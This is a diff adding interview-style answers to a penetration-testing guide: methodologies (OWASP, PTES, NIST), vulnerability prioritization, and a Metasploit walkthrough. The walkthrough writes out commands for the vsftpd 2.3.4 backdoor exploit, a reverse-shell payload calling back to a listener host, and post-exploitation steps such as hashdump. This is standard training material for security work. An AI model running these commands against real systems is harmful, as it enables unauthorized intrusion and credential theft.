@@ -250,6 +250,75 @@ I follow a **systematic and risk-based methodology** to ensure thorough, accurat
 > My goal is not just to scan and list issues — but to **deliver insights the client can act on**. 
 I balance automation with manual validation and always focus on real-world risk, not just technical flaws.
 
+-
+
+1.12 What penetration testing methodologies do you follow (OWASP, NIST, PTES)?
+
+I follow a combination of **industry-standard frameworks** based on the **type of engagement** (web app, infrastructure, or compliance-driven). Here’s how I align them:
+
+---
+
+### 1. **OWASP Testing Guide (Web Applications)**
+
+✅ Best for: **Web and API pentesting**
+
+* I use OWASP’s categories (e.g., **A01:2021 – Broken Access Control**, etc.) to guide my testing checklist.
+* Covers:
+
+  * Input validation & injection
+  * Authentication/authorization flaws
+  * Session management
+  * Business logic flaws
+  * API-specific issues
+
+📌 Tools: Burp Suite, ZAP, Nuclei, Postman
+
+---
+
+### 2. **PTES – Penetration Testing Execution Standard**
+
+✅ Best for: **End-to-end structured engagements**
+
+* **Pre-engagement interactions** – Scope, ROE, client goals
+* **Intelligence gathering** – Passive/active recon
+* **Threat modeling** – Identify likely attack paths
+* **Exploitation** – Manual & automated
+* **Post-exploitation** – Persistence, data access, privilege escalation
+* **Reporting** – Clear, prioritized risk communication
+
+📌 PTES gives me a **comprehensive, attacker-mindset approach** with real-world relevance.
+
+---
+
+### 3. **NIST SP 800-115**
+
+✅ Best for: **Government/compliance-focused orgs**
+
+* More formal and **risk-focused**
+* Emphasizes:
+
+  * Planning & risk analysis
+  * Technical testing
+  * Security assessment reporting
+* Useful for environments with strict regulatory controls
+
+---
+
+## 🔄 My Approach (How I combine them)
+
+| Layer                | Methodology Used    |
+| -------------------- | ------------------- |
+| Web/API testing      | OWASP Testing Guide |
+| Full engagement flow | PTES                |
+| Compliance alignment | NIST SP 800-115     |
+
+---
+
+### ✅ Summary:
+
+> I typically begin with **PTES** for structure, use **OWASP** for deep technical web testing, and align with **NIST** when working in regulated environments. 
+This hybrid approach helps me ensure both **technical depth** and **compliance coverage**.
+
 --
 
 2. Vulnerability & Threat Landscape
@@ -336,6 +405,73 @@ To stay updated with the latest vulnerabilities and security trends in offensive
 5.Training and Certifications**: Pursue continuous learning through platforms like TryHackMe, Hack The Box, or certifications like OSCP, OSCE, to keep skills current.
 6.Threat Intelligence**: Follow reports from firms like Mandiant or CrowdStrike and track MITRE ATT&CK updates for evolving adversary TTPs.
 7.Lab Testing**: Replicate new vulnerabilities in a controlled lab using tools like Metasploit or custom scripts to understand exploitation and mitigation.
+
+-
+
+2.5 How do you prioritize vulnerabilities in your reports?
+
+I prioritize vulnerabilities using a **risk-based, impact-driven approach** that combines technical severity with business context.
+
+---
+
+### 🔢 1. **CVSS Score (Base Reference)**
+
+* I start by using **CVSS (Common Vulnerability Scoring System)** to get an initial severity level:
+
+  * Low / Medium / High / Critical
+* Tools like Nessus, Burp Suite, or Nuclei often provide CVSS ratings.
+
+> ⚠️ *But CVSS is just a starting point — not the final word.*
+
+---
+
+### 🧠 2. **Real-World Exploitability**
+
+* Can it be **exploited remotely without authentication**?
+* Is there **public exploit code** or Metasploit module?
+* Is user interaction required?
+
+If it’s easily exploitable in a real-world scenario, I may **escalate the priority**.
+
+---
+
+### 🏢 3. **Business Impact**
+
+* Does the vulnerability allow access to **PII, financial data, or critical systems**?
+* Could it result in **reputation loss, compliance violation**, or **service downtime**?
+* A low-severity issue technically may be **high-impact** if tied to sensitive data.
+
+---
+
+### 🔄 4. **Exposure & Reachability**
+
+* Is the vulnerable system **public-facing**?
+* Are affected services **internally reachable** by all users or just admins?
+* I raise priority if the attack surface is broad.
+
+---
+
+### 🔐 5. **Privilege Escalation Potential**
+
+* Even low-risk bugs may become **critical** if they allow chaining into privilege escalation or lateral movement.
+
+---
+
+## 🔧 Example Prioritization Tags in My Reports:
+
+| Severity          | When I Use It                                                        |
+| ----------------- | -------------------------------------------------------------------- |
+| **Critical**      | Full remote compromise, unauthenticated RCE, PII/data theft          |
+| **High**          | Authenticated RCE, IDOR on sensitive data, SQLi                      |
+| **Medium**        | XSS, directory listing, version disclosure with no immediate exploit |
+| **Low**           | Missing security headers, info leaks, verbose error messages         |
+| **Informational** | Unused subdomains, software banners, etc.                            |
+
+---
+
+### ✅ Summary:
+
+> I prioritize vulnerabilities by combining **technical severity**, **exploitability**, **business risk**, and **environmental exposure** — always making sure my clients understand **what matters most, why it matters, and what to fix first.**
 
 --
 
@@ -1301,6 +1437,124 @@ nmap -A 192.168.1.1                 # Aggressive (OS, version, scripts, tracerou
 4. **OS detection** → `nmap -O`, `hping3`
 5. **Vuln scan** → `Nessus`, `OpenVAS`
 6. **Web recon** → `Nikto`, `whatweb`, `dirb`, `Gobuster`
+
+-
+
+5.7 How do you use Metasploit for exploitation?
+
+## 🛠️ **Metasploit Exploitation Workflow**
+
+Metasploit is used to **exploit known vulnerabilities**, gain access to systems, and run post-exploitation modules. Here's how:
+
+---
+
+### ✅ 1. **Start Metasploit Console**
+
+```bash
+msfconsole
+```
+
+---
+
+### 🔍 2. **Search for a Vulnerability Module**
+
+You can search for known exploits using keywords (like service name or CVE):
+
+```bash
+search vsftpd
+search type:exploit name:windows
+```
+
+---
+
+### 📦 3. **Select and Load an Exploit Module**
+
+```bash
+use exploit/unix/ftp/vsftpd_234_backdoor
+```
+
+---
+
+### 🎯 4. **View and Set Required Options**
+
+Check what’s needed:
+
+```bash
+show options
+```
+
+Then set target parameters:
+
+```bash
+set RHOST 192.168.1.10
+set RPORT 21
+```
+
+---
+
+### 💣 5. **Choose a Payload**
+
+Payload = What runs when the exploit works (e.g., reverse shell).
+
+```bash
+set PAYLOAD linux/x86/shell_reverse_tcp
+set LHOST 192.168.1.100
+set LPORT 4444
+```
+
+Check compatible payloads:
+
+```bash
+show payloads
+```
+
+---
+
+### 🚀 6. **Run the Exploit**
+
+```bash
+exploit
+```
+
+If successful, you'll get a shell or meterpreter session.
+
+---
+
+### 🧰 7. **Post-Exploitation (Optional)**
+
+If using Meterpreter:
+
+```bash
+sysinfo
+getuid
+hashdump
+shell
+```
+
+You can also pivot, escalate privileges, dump credentials, or maintain access.
+
+---
+
+## 📌 Example: Exploiting vsftpd 2.3.4
+
+```bash
+msfconsole
+search vsftpd
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOST 10.10.10.3
+set RPORT 21
+exploit
+```
+
+If vulnerable, you'll get a root shell.
+
+---
+
+## 🔒 Best Practices
+
+* Use **Metasploit in labs or authorized environments** only.
+* Always validate the vulnerability manually when possible.
+* Use **`set VERBOSE true`** to debug issues during exploitation.
 
 --
 
